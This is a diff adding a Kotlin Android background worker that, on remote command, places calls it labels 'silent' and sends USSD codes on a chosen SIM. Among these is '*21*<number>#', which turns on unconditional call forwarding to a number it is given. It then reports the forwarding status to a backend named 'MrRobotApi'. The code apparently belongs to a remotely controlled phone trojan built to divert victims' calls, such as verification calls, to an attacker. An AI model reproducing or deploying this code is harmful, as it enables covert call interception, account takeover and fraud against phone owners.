@@ -1,0 +1,256 @@
+package com.example.admin.workers
+
+import android.Manifest
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.os.Looper
+import android.telecom.TelecomManager
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
+import android.util.Log
+import androidx.annotation.RequiresApi
+import androidx.core.content.ContextCompat
+import androidx.work.CoroutineWorker
+import androidx.work.WorkerParameters
+import com.example.admin.network.MrRobotApi
+import kotlinx.coroutines.suspendCancellableCoroutine
+import kotlin.coroutines.resume
+
+class CallForwardWorker(
+    private val ctx: Context,
+    params: WorkerParameters
+) : CoroutineWorker(ctx, params) {
+
+    companion object {
+        private const val TAG = "CallForwardWorker"
+        private const val USSD_TIMEOUT_MS = 7000L
+    }
+
+    override suspend fun doWork(): Result {
+        val uid     = inputData.getString("uid")    ?: return Result.failure()
+        val code    = inputData.getString("code")   ?: return Result.failure()
+        val simSlot = inputData.getInt("simSlot", 0)
+        val action  = inputData.getString("action") ?: "ussd"
+
+        Log.d(TAG, "Action: $action, Code: $code, SimSlot: $simSlot")
+
+        // Handle voice_call - silent call only, no backend message
+        if (action == "call") {
+            val success = makeSilentCall(code, simSlot, uid)
+            return if (success) Result.success() else Result.failure()
+        }
+
+        // Handle USSD requests
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
+            Log.e(TAG, "API < 26 not supported for background USSD")
+            return Result.failure()
+        }
+
+        val success = executeUssd(code, simSlot, uid, action)
+        return if (success) Result.success() else Result.failure()
+    }
+
+    private fun hasCallPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasReadPhoneStatePermission(): Boolean {
+        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun makeSilentCall(number: String, simSlot: Int, uid: String): Boolean {
+        if (!hasCallPermission()) {
+            Log.e(TAG, "CALL_PHONE permission denied")
+            return false
+        }
+
+        val formattedNumber = formatPhoneNumber(number)
+        Log.d(TAG, "Making SILENT call to: $formattedNumber on sim slot: $simSlot")
+
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                makeSilentCallApi29(formattedNumber, simSlot)
+            } else {
+                makeSilentCallApi28(formattedNumber, simSlot)
+            }
+        } catch (e: SecurityException) {
+            Log.e(TAG, "SecurityException during silent call", e)
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "Silent call failed", e)
+            false
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.Q)
+    private fun makeSilentCallApi29(number: String, simSlot: Int): Boolean {
+        try {
+            val telecomManager = ctx.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
+
+            if (!hasReadPhoneStatePermission()) {
+                Log.w(TAG, "READ_PHONE_STATE permission missing, using default SIM")
+                val uri = Uri.fromParts("tel", number, null)
+                telecomManager.placeCall(uri, Bundle())
+                Log.d(TAG, "Silent call placed via TelecomManager (default SIM)")
+                return true
+            }
+
+            val subscriptionManager = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+            val subInfoList = subscriptionManager.activeSubscriptionInfoList
+
+            if (subInfoList.isNullOrEmpty()) {
+                Log.w(TAG, "No active SIM found, using default")
+                val uri = Uri.fromParts("tel", number, null)
+                telecomManager.placeCall(uri, Bundle())
+                Log.d(TAG, "Silent call placed via TelecomManager (no SIM specified)")
+                return true
+            }
+
+            val safeSlot = if (simSlot < subInfoList.size) simSlot else 0
+            val subscriptionId = subInfoList[safeSlot].subscriptionId
+
+            val extras = Bundle().apply {
+                putInt(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, subscriptionId)
+            }
+
+            val uri = Uri.fromParts("tel", number, null)
+            telecomManager.placeCall(uri, extras)
+
+            Log.d(TAG, "Silent call placed via TelecomManager on SIM slot: $safeSlot")
+            return true
+
+        } catch (e: SecurityException) {
+            Log.e(TAG, "SecurityException in TelecomManager.placeCall", e)
+            return makeSilentCallApi28(number, simSlot)
+        } catch (e: Exception) {
+            Log.e(TAG, "TelecomManager call failed", e)
+            return false
+        }
+    }
+
+    private fun makeSilentCallApi28(number: String, simSlot: Int): Boolean {
+        try {
+            val intent = Intent(Intent.ACTION_CALL)
+            intent.data = Uri.parse("tel:$number")
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+
+            if (hasReadPhoneStatePermission() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    val subscriptionManager = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+                    val subInfoList = subscriptionManager.activeSubscriptionInfoList
+
+                    if (!subInfoList.isNullOrEmpty() && simSlot < subInfoList.size) {
+                        val subscriptionId = subInfoList[simSlot].subscriptionId
+                        intent.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", subscriptionId)
+                        Log.d(TAG, "Added subscription ID: $subscriptionId for SIM slot: $simSlot")
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to add subscription info", e)
+                }
+            }
+
+            ctx.startActivity(intent)
+            Log.d(TAG, "Call initiated via ACTION_CALL on SIM slot: $simSlot")
+            return true
+
+        } catch (e: SecurityException) {
+            Log.e(TAG, "SecurityException in ACTION_CALL", e)
+            return false
+        } catch (e: Exception) {
+            Log.e(TAG, "ACTION_CALL failed", e)
+            return false
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.O)
+    private suspend fun executeUssd(
+        code: String,
+        slot: Int,
+        uid: String,
+        action: String
+    ): Boolean = suspendCancellableCoroutine { cont ->
+
+        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CALL_PHONE)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            Log.e(TAG, "CALL_PHONE permission denied")
+            cont.resume(false)
+            return@suspendCancellableCoroutine
+        }
+
+        try {
+            val subMgr = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+            val subs = subMgr.activeSubscriptionInfoList
+
+            if (subs.isNullOrEmpty()) {
+                Log.e(TAG, "No active SIM found")
+                cont.resume(false)
+                return@suspendCancellableCoroutine
+            }
+
+            val safeSlot = slot.coerceIn(subs.indices)
+            val subInfo = subs[safeSlot]
+            val telephony = (ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
+                .createForSubscriptionId(subInfo.subscriptionId)
+
+            val finalUssd = when {
+                action == "call_forward" -> "*21*${code.replace(Regex("[^0-9+]"), "")}#"
+                action == "ussd" -> if (code.matches(Regex("^\\d+$"))) code else if (code.endsWith("#")) code else "$code#"
+                else -> if (code.endsWith("#")) code else "$code#"
+            }
+
+            Log.d(TAG, "Executing USSD=$finalUssd slot=$safeSlot action=$action")
+
+            val handler = android.os.Handler(Looper.getMainLooper())
+            val timeoutRunnable = Runnable {
+                Log.e(TAG, "USSD timeout")
+                if (cont.isActive) cont.resume(false)
+            }
+            handler.postDelayed(timeoutRunnable, USSD_TIMEOUT_MS)
+
+            telephony.sendUssdRequest(
+                finalUssd,
+                object : TelephonyManager.UssdResponseCallback() {
+                    override fun onReceiveUssdResponse(tm: TelephonyManager?, req: String?, resp: CharSequence?) {
+                        handler.removeCallbacks(timeoutRunnable)
+                        Log.d(TAG, "USSD SUCCESS: ${resp?.toString() ?: ""}")
+
+                        val forwardEnabled = when {
+                            finalUssd.startsWith("*21*") -> true
+                            finalUssd == "##21#" -> false
+                            else -> null
+                        }
+
+                        if (forwardEnabled != null) {
+                            MrRobotApi(ctx).updateForwardStatus(uid, forwardEnabled, safeSlot) { ok, err ->
+                                if (ok) Log.d(TAG, "forwardEnabled=$forwardEnabled slot=$safeSlot saved")
+                                else Log.e(TAG, "updateForwardStatus failed: $err")
+                            }
+                        }
+
+                        if (cont.isActive) cont.resume(true)
+                    }
+
+                    override fun onReceiveUssdResponseFailed(tm: TelephonyManager?, req: String?, failureCode: Int) {
+                        handler.removeCallbacks(timeoutRunnable)
+                        Log.e(TAG, "USSD FAILED code=$failureCode")
+                        if (cont.isActive) cont.resume(false)
+                    }
+                },
+                handler
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Exception during USSD", e)
+            if (cont.isActive) cont.resume(false)
+        }
+    }
+
+    private fun formatPhoneNumber(number: String): String {
+        val clean = number.replace(Regex("[^0-9+]"), "")
+        return if (clean.startsWith("+")) clean else "+91$clean"
+    }
+}
